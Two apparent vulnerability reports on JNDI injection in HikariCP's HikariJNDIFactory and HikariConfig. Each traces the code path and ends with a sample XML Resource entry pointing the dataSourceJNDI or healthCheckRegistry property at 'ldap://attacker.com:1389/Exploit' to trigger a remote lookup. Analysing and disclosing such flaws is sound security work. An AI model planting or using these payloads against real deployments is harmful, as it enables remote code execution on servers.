Title: JNDI Injection via dataSourceJNDI in HikariJNDIFactory
Analysis:
### Vulnerability Analysis
The `HikariJNDIFactory` class, which implements `javax.naming.spi.ObjectFactory`, is used by JNDI context managers to reconstruct `HikariDataSource` instances from JNDI references. It parses properties from the `Reference` object (via `ref.getAll()`), populates them into a `Properties` collection, and passes them to `HikariConfig` / `HikariDataSource`.

If the `dataSourceJNDI` property is present in the JNDI Reference, the factory calls `lookupJndiDataSource`, which performs a direct JNDI lookup using the provided `dataSourceJNDI` value:
```java
jndiDS = (DataSource) ic.lookup(jndiName);
```
Since the `dataSourceJNDI` value is parsed directly from the incoming JNDI reference without validation or restriction, an attacker who can manipulate the Reference attributes (or supply a malicious reference) can trigger arbitrary JNDI lookups, leading to potential Remote Code Execution (RCE).

### Conceptual Exploit Payload
An attacker can specify a malicious `dataSourceJNDI` parameter in a JNDI Reference using `HikariJNDIFactory` as the factory:

```xml
<Resource name="jdbc/hikarids"
          auth="Container"
          type="javax.sql.DataSource"
          factory="com.zaxxer.hikari.HikariJNDIFactory"
          dataSourceJNDI="ldap://attacker.com:1389/Exploit" />
```

When lookup is called, `HikariJNDIFactory` will read `dataSourceJNDI` and invoke `InitialContext().lookup("ldap://attacker.com:1389/Exploit")`.

Title: JNDI Injection via healthCheckRegistry in HikariConfig
Analysis:
### Vulnerability Analysis
The `HikariConfig` class contains a JNDI Injection vulnerability in the `setHealthCheckRegistry` method. When configuring the health check registry via bean properties (e.g. through `HikariJNDIFactory` or other configuration loaders), the parameter is accepted as an `Object`. If a `String` is provided, `PropertyElf` reflective setter property population executes `setHealthCheckRegistry` with the string value.

Within `setHealthCheckRegistry`, `getObjectOrPerformJndiLookup` is invoked with this string. This helper function initializes `new InitialContext()` and performs a JNDI lookup directly on the user-supplied string without any validation or sanitization. An attacker who can control the connection pool configuration properties (for example, through JNDI Reference manipulation in a JNDI injection vector or shared configuration files) can supply a malicious LDAP/RMI JNDI URL. This will cause the application to perform a lookup to the attacker's server, leading to Remote Code Execution (RCE).

### Conceptual Exploit Payload
To trigger this vulnerability, an attacker can define a JNDI Reference pointing to `HikariJNDIFactory` with `healthCheckRegistry` set to a malicious LDAP server:

```xml
<Resource name="jdbc/hikarids"
          auth="Container"
          type="javax.sql.DataSource"
          factory="com.zaxxer.hikari.HikariJNDIFactory"
          healthCheckRegistry="ldap://attacker.com:1389/Exploit" />
```

When JNDI lookup is performed on `jdbc/hikarids`, `HikariJNDIFactory` will instantiate `HikariConfig`, populate `healthCheckRegistry` with the attacker's LDAP URL, and trigger `InitialContext.lookup("ldap://attacker.com:1389/Exploit")`.
